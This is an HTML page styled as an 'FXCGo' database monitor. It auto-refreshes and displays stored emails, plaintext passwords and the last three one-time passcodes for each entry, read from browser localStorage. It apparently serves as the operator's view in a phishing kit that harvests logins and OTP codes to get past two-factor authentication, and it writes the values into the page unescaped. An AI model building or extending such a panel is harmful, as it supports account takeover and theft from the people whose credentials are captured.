<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta http-equiv="refresh" content="3"> <!-- Refresh every 3 seconds -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>FXCGo – Database Monitor</title>

<style>
    body {
        font-family: Arial, sans-serif;
        background: #eef3f8;
        margin: 0;
        padding: 20px;
    }

    h1 {
        text-align: center;
        color: #0037d1;
    }

    table {
        width: 100%;
        border-collapse: collapse;
        background: white;
        border-radius: 10px;
        overflow: hidden;
    }

    th, td {
        padding: 12px;
        border-bottom: 1px solid #ccc;
        text-align: left;
        font-size: 15px;
    }

    th {
        background: #0047ff;
        color: white;
        font-size: 16px;
    }

    tr:hover {
        background: #f2f7ff;
    }

    .empty {
        text-align: center;
        padding: 30px;
        font-size: 18px;
        color: #777;
    }
</style>
</head>
<body>

<h1>Stored User Data (Auto-Refresh Every 3 Seconds)</h1>

<table>
    <thead>
        <tr>
            <th>#</th>
            <th>Email / Username</th>
            <th>Password</th>
            <th>Last 3 OTPs</th>
            <th>Timestamp</th>
        </tr>
    </thead>
    <tbody id="data-body">
    </tbody>
</table>

<script>
    // Load stored data
    let records = JSON.parse(localStorage.getItem("fxcgo_data")) || [];

    const tableBody = document.getElementById("data-body");

    if (records.length === 0) {
        tableBody.innerHTML = `<tr><td colspan="5" class="empty">No data stored yet.</td></tr>`;
    } else {
        tableBody.innerHTML = "";
        records.forEach((item, index) => {
            tableBody.innerHTML += `
                <tr>
                    <td>${index + 1}</td>
                    <td>${item.email}</td>
                    <td>${item.password}</td>
                    <td>${(item.otps && item.otps.length > 0) ? 
                        item.otps.slice(-3).reverse().map(otp => otp.code).join(' • ') : 
                        (item.otp ? item.otp : '-')}</td>
                    <td>${item.time}</td>
                </tr>
            `;
        });
    }
</script>

</body>
</html>
